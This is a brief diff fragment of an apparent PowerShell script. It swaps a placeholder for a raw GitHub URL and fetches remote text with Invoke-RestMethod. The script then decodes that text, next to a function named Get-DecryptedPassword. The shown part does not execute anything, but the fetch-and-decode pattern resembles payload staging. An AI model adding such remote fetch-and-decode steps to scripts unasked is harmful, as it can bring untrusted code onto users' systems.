@@ -43,7 +43,7 @@ Function Get-DecryptedPassword {
 }
 
 # Main script
-$url = "your_initial_text_url_here" # Replace this with the actual URL
+$url = "https://raw.githubusercontent.com/notforuseactually/404/main/8.txt" # Replace this with the actual URL
 $rawText = Invoke-RestMethod -Uri $url
 
 # Decode and convert process
